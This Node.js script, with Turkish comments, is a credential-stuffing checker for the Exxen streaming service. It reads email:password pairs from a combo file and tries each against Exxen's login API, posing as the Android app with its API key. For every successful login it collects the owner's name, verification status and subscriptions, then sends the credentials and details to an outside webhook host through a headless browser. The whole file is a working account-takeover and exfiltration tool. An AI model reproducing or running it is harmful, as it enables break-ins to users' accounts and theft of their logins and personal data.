const puppeteer = require('puppeteer');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const fs = require('fs');
const path = require('path');
const comboFilePath = path.join(__dirname, 'combo.txt');

// Webhook için Puppeteer ile istek gönderme fonksiyonu
async function sendWebhookRequest(email, password, packages, start_date, end_date) {
    const browser = await puppeteer.launch({
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    const page = await browser.newPage();
    const webhookUrl = `http://ferlinblutv.rf.gd/webhookexxen.php?user=${email}&pass=${password}&packages=${packages}&start_date=${start_date}&end_date=${end_date}`;

    await page.goto(webhookUrl);
    console.log(`Webhook şu kullanıcı için gönderildi: ${email}`);
    await browser.close();
}

// Hesapları kontrol eden fonksiyon
async function checkAccounts() {
    const comboList = fs.readFileSync(comboFilePath, 'utf-8').split('\n').filter(Boolean);

    for (let line of comboList) {
        const [email, password] = line.split(':');
        console.log(`Kontrol ediliyor: Email: ${email}, Şifre: ${password}`);

        // Exxen API isteği
        const url = 'https://api-crm.exxen.com/membership/login/email?key=5f07276b91aa33e4bc446c54a9e982a8';
        const headers = {
            'accept-encoding': 'gzip',
            'content-type': 'application/json; charset=UTF-8',
            'origin': 'com.exxen.android',
            'user-agent': 'com.exxen.android/1.0.27 (Android/9; en_US; brand/samsung; model/SM-T725; build/PPR1.180610.011)'
        };
        const payload = {
            'Email': email,
            'Password': password,
            'RememberMe': 1
        };

        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(payload)
            });
            const apiResponse = await response.json(); // JSON formatında yanıtı al

            // Giriş başarılı mı kontrol et
            if (apiResponse.Success) {
                const result = apiResponse.Result;
                const user = result.User || {};
                const name = user.Name || '';
                const surname = user.Surname || '';
                const email_verified = result.EmailVerified ? '✔️' : '❌';
                const phone_verified = result.MobileVerified ? '✔️' : '❌';
                const subscriptions = result.Subscriptions || [];

                if (subscriptions.length > 0) {
                    const firstSubscription = subscriptions[0];
                    const start_date = firstSubscription.PurchaseDate.split('T')[0];
                    const end_date = firstSubscription.ExpireDate.split('T')[0];
                    const package_names = subscriptions.map(sub => sub.LicenseName).join(', ');

                    console.log(`\x1b[32m\n                ! HİT HESAP ÇIKTI !                \x1b[0m`);
                    console.log(`Email: ${email}`);
                    console.log(`Şifre: ${password}`);
                    console.log(`İsim: ${name}`);
                    console.log(`Soyad: ${surname}`);
                    console.log(`Email Doğrulaması: ${email_verified}`);
                    console.log(`Telefon Doğrulaması: ${phone_verified}`);
                    console.log(`Paketler: ${package_names}`);
                    console.log(`Başlangıç Tarihi: ${start_date}`);
                    console.log(`Bitiş Tarihi: ${end_date}`);

                    // HİT hesaplar için webhook isteği gönder
                    await sendWebhookRequest(email, password, package_names, start_date, end_date);
                } else {
                    console.log(`\x1b[33m\n                ! CUSTOM HESAP ÇIKTI !                \x1b[0m`);
                    console.log(`Email: ${email}`);
                    console.log(`Şifre: ${password}`);
                    console.log(`İsim: ${name}`);
                    console.log(`Soyad: ${surname}`);

                    // Custom hesapları da Aysun için test amacıyla webhook'a gönderelim
                    await sendWebhookRequest(email, password, "Custom hesap", "Bilinmiyor", "Bilinmiyor");
                }
            } else if (apiResponse.ErrorMessage && apiResponse.ErrorMessage.includes("Your account is blocked")) {
                console.log(`\x1b[33m\n                ! CUSTOM HESAP ÇIKTI (BLOCKED) !                \x1b[0m`);
            } else {
                console.log(`\x1b[31m\n                ! GİRİŞ BAŞARISIZ !                \x1b[0m`);
            }
        } catch (error) {
            console.log('API hatası:', error);
        }

        // Kullanılmış combo'yu sil
        const updatedComboList = comboList.filter(item => item !== line).join('\n');
        fs.writeFileSync(comboFilePath, updatedComboList, 'utf-8');
        await new Promise(resolve => setTimeout(resolve, 5000)); // Hesaplar arasında 5 saniye bekle
    }
}

checkAccounts();
